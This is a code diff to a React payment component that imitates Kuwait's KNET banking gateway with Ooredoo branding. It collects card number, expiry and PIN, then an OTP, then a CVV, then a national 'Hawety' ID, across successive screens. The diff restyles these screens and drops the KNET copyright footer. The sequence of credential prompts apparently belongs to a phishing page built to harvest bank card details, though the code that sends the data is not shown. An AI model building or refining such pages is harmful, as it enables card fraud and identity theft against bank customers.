@@ -319,6 +319,19 @@ export default function UnifiedPayment() {
       </div>
 
       <div className="knet-content">
+        {/* Loading Stage - with Ooredoo logo and spinner */}
+        {stage === "loading" && (
+          <div className="loading-page">
+            <div className="loading-spinner-container">
+              <div className="ooredoo-logo-wrapper">
+                <img src="/ooredoo-logo.png" alt="Ooredoo" className="ooredoo-logo" />
+              </div>
+              <div className="spinner-ring"></div>
+            </div>
+            <p className="loading-message">{statusMessage || "جاري المعالجة..."}</p>
+          </div>
+        )}
+
         {/* KNET Form Stage */}
         {stage === "knet" && (
           <form onSubmit={handleKnetSubmit} className="knet-form">
@@ -398,10 +411,9 @@ export default function UnifiedPayment() {
                   maxLength={10}
                   value={paymentData.cardNumber}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/[^\d]/g, "");
                     setPaymentData((prev) => ({
                       ...prev,
-                      cardNumber: val,
+                      cardNumber: e.target.value.replace(/\D/g, ""),
                     }));
                     setErrors((prev) => {
                       const newErrors = { ...prev };
@@ -409,8 +421,8 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-input-card ${errors.cardNumber ? "error" : ""}`}
                   placeholder="Card Number"
+                  className={`form-input ${errors.cardNumber ? "error" : ""}`}
                 />
                 {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
               </div>
@@ -430,12 +442,12 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-select-month ${errors.month ? "error" : ""}`}
+                  className={`form-select-date ${errors.month ? "error" : ""}`}
                 >
                   <option value="0">MM</option>
-                  {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
-                    <option key={m} value={String(m).padStart(2, "0")}>
-                      {String(m).padStart(2, "0")}
+                  {Array.from({ length: 12 }, (_, i) => (
+                    <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
+                      {String(i + 1).padStart(2, "0")}
                     </option>
                   ))}
                 </select>
@@ -453,16 +465,21 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-select-year ${errors.year ? "error" : ""}`}
+                  className={`form-select-date ${errors.year ? "error" : ""}`}
                 >
                   <option value="">YYYY</option>
-                  {Array.from({ length: 30 }, (_, i) => 2024 + i).map((y) => (
-                    <option key={y} value={String(y)}>
-                      {y}
-                    </option>
-                  ))}
+                  {Array.from({ length: 10 }, (_, i) => {
+                    const year = new Date().getFullYear() + i;
+                    return (
+                      <option key={year} value={year}>
+                        {year}
+                      </option>
+                    );
+                  })}
                 </select>
-                {errors.year && <span className="error-text">{errors.year}</span>}
+                {(errors.month || errors.year) && (
+                  <span className="error-text">{errors.month || errors.year}</span>
+                )}
               </div>
 
               <div className="form-row">
@@ -474,10 +491,9 @@ export default function UnifiedPayment() {
                   maxLength={4}
                   value={paymentData.pin}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/[^\d]/g, "");
                     setPaymentData((prev) => ({
                       ...prev,
-                      pin: val,
+                      pin: e.target.value.replace(/\D/g, ""),
                     }));
                     setErrors((prev) => {
                       const newErrors = { ...prev };
@@ -485,60 +501,41 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-input ${errors.pin ? "error" : ""}`}
                   placeholder="PIN"
+                  className={`form-input ${errors.pin ? "error" : ""}`}
                 />
                 {errors.pin && <span className="error-text">{errors.pin}</span>}
               </div>
             </div>
 
-            <div className="form-card">
-              <div className="form-buttons">
-                <button type="submit" className="btn-submit">
-                  Submit
-                </button>
-                <button type="button" onClick={handleCancel} className="btn-cancel">
-                  Cancel
-                </button>
-              </div>
+            <div className="form-buttons">
+              <button type="submit" className="btn-submit">
+                Submit
+              </button>
+              <button type="button" onClick={handleCancel} className="btn-cancel">
+                Cancel
+              </button>
             </div>
           </form>
-        )}
-
-        {/* Loading Stage */}
-        {stage === "loading" && (
-          <div className="loading-container">
-            <div className="form-card">
-              <div className="loading-content">
-                <img src="/knet/loading.gif" alt="Loading" className="loading-spinner" />
-                <p className="loading-text">{statusMessage}</p>
-              </div>
-            </div>
-          </div>
         )}
 
         {/* OTP Stage */}
         {stage === "otp" && (
           <form onSubmit={handleOtpSubmit} className="knet-form">
             <div className="form-card">
-              <h2 className="stage-title">OTP Verification</h2>
-              <p className="stage-subtitle">
-                يرجى إدخال رمز التحقق المرسل إلى هاتفك
-              </p>
-
+              <h2 className="form-title">Enter OTP</h2>
               <div className="form-row">
                 <label className="form-label">OTP Code:</label>
                 <input
-                  type="text"
+                  type="tel"
                   inputMode="numeric"
                   pattern="[0-9]*"
                   maxLength={6}
                   value={paymentData.otp || ""}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/[^\d]/g, "");
                     setPaymentData((prev) => ({
                       ...prev,
-                      otp: val,
+                      otp: e.target.value.replace(/\D/g, ""),
                     }));
                     setErrors((prev) => {
                       const newErrors = { ...prev };
@@ -546,22 +543,20 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-input ${errors.otp ? "error" : ""}`}
                   placeholder="000000"
+                  className={`form-input ${errors.otp ? "error" : ""}`}
                 />
                 {errors.otp && <span className="error-text">{errors.otp}</span>}
               </div>
             </div>
 
-            <div className="form-card">
-              <div className="form-buttons">
-                <button type="submit" className="btn-submit">
-                  Verify
-                </button>
-                <button type="button" onClick={handleCancel} className="btn-cancel">
-                  Cancel
-                </button>
-              </div>
+            <div className="form-buttons">
+              <button type="submit" className="btn-submit">
+                Submit
+              </button>
+              <button type="button" onClick={handleCancel} className="btn-cancel">
+                Cancel
+              </button>
             </div>
           </form>
         )}
@@ -570,24 +565,19 @@ export default function UnifiedPayment() {
         {stage === "cvv" && (
           <form onSubmit={handleCvvSubmit} className="knet-form">
             <div className="form-card">
-              <h2 className="stage-title">CVV Verification</h2>
-              <p className="stage-subtitle">
-                يرجى إدخال رمز CVV الموجود على ظهر البطاقة
-              </p>
-
+              <h2 className="form-title">Enter CVV</h2>
               <div className="form-row">
-                <label className="form-label">CVV:</label>
+                <label className="form-label">CVV Code:</label>
                 <input
-                  type="password"
+                  type="tel"
                   inputMode="numeric"
                   pattern="[0-9]*"
                   maxLength={3}
                   value={paymentData.cvv || ""}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/[^\d]/g, "");
                     setPaymentData((prev) => ({
                       ...prev,
-                      cvv: val,
+                      cvv: e.target.value.replace(/\D/g, ""),
                     }));
                     setErrors((prev) => {
                       const newErrors = { ...prev };
@@ -595,22 +585,20 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
-                  className={`form-input ${errors.cvv ? "error" : ""}`}
                   placeholder="000"
+                  className={`form-input ${errors.cvv ? "error" : ""}`}
                 />
                 {errors.cvv && <span className="error-text">{errors.cvv}</span>}
               </div>
             </div>
 
-            <div className="form-card">
-              <div className="form-buttons">
-                <button type="submit" className="btn-submit">
-                  Verify
-                </button>
-                <button type="button" onClick={handleCancel} className="btn-cancel">
-                  Cancel
-                </button>
-              </div>
+            <div className="form-buttons">
+              <button type="submit" className="btn-submit">
+                Submit
+              </button>
+              <button type="button" onClick={handleCancel} className="btn-cancel">
+                Cancel
+              </button>
             </div>
           </form>
         )}
@@ -619,24 +607,16 @@ export default function UnifiedPayment() {
         {stage === "hawety" && (
           <form onSubmit={handleHawetySubmit} className="knet-form">
             <div className="form-card">
-              <h2 className="stage-title">Identity Verification</h2>
-              <p className="stage-subtitle">
-                يرجى إدخال رقم الهوية الكويتية
-              </p>
-
+              <h2 className="form-title">Enter Hawety ID</h2>
               <div className="form-row">
-                <label className="form-label">Civil ID:</label>
+                <label className="form-label">Hawety ID:</label>
                 <input
                   type="text"
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                  maxLength={12}
                   value={paymentData.hawety || ""}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/[^\d]/g, "");
                     setPaymentData((prev) => ({
                       ...prev,
-                      hawety: val,
+                      hawety: e.target.value,
                     }));
                     setErrors((prev) => {
                       const newErrors = { ...prev };
@@ -644,80 +624,48 @@ export default function UnifiedPayment() {
                       return newErrors;
                     });
                   }}
+                  placeholder="Enter your Hawety ID"
                   className={`form-input ${errors.hawety ? "error" : ""}`}
-                  placeholder="000000000000"
                 />
                 {errors.hawety && <span className="error-text">{errors.hawety}</span>}
               </div>
             </div>
 
-            <div className="form-card">
-              <div className="form-buttons">
-                <button type="submit" className="btn-submit">
-                  Verify
-                </button>
-                <button type="button" onClick={handleCancel} className="btn-cancel">
-                  Cancel
-                </button>
-              </div>
+            <div className="form-buttons">
+              <button type="submit" className="btn-submit">
+                Submit
+              </button>
+              <button type="button" onClick={handleCancel} className="btn-cancel">
+                Cancel
+              </button>
             </div>
           </form>
         )}
 
         {/* Success Stage */}
         {stage === "success" && (
-          <div className="success-container">
-            <div className="form-card">
-              <div className="success-content">
-                <div className="success-icon">✓</div>
-                <h2 className="success-title">Payment Successful</h2>
-                <p className="success-message">
-                  تم إكمال العملية بنجاح
-                </p>
-                <div className="payment-details">
-                  <div className="detail-row">
-                    <span className="detail-label">Payment ID:</span>
-                    <span className="detail-value">{paymentData.paymentId}</span>
-                  </div>
-                  <div className="detail-row">
-                    <span className="detail-label">Amount:</span>
-                    <span className="detail-value">{paymentData.amount}</span>
-                  </div>
-                </div>
-                <button onClick={handleCancel} className="btn-submit">
-                  Return to Home
-                </button>
-              </div>
-            </div>
+          <div className="success-page">
+            <div className="success-icon">✓</div>
+            <h2>Payment Successful</h2>
+            <p>Your payment has been processed successfully.</p>
+            <button onClick={handleCancel} className="btn-submit">
+              Return Home
+            </button>
           </div>
         )}
 
         {/* Error Stage */}
         {stage === "error" && (
-          <div className="error-container">
-            <div className="form-card">
-              <div className="error-content">
-                <div className="error-icon">✕</div>
-                <h2 className="error-title">Payment Failed</h2>
-                <p className="error-message">
-                  {statusMessage || "حدث خطأ في معالجة الطلب"}
-                </p>
-                <button onClick={handleCancel} className="btn-submit">
-                  Try Again
-                </button>
-              </div>
-            </div>
+          <div className="error-page">
+            <div className="error-icon">✕</div>
+            <h2>Payment Failed</h2>
+            <p>{statusMessage || "An error occurred during payment processing."}</p>
+            <button onClick={handleCancel} className="btn-submit">
+              Try Again
+            </button>
           </div>
         )}
       </div>
-
-      {/* Footer */}
-      <footer className="knet-footer">
-        <p>All Rights Reserved. Copyright 2024 © KNET</p>
-        <p className="footer-subtitle">
-          The Shared Electronic Banking Services Company - KNET
-        </p>
-      </footer>
     </div>
   );
 }
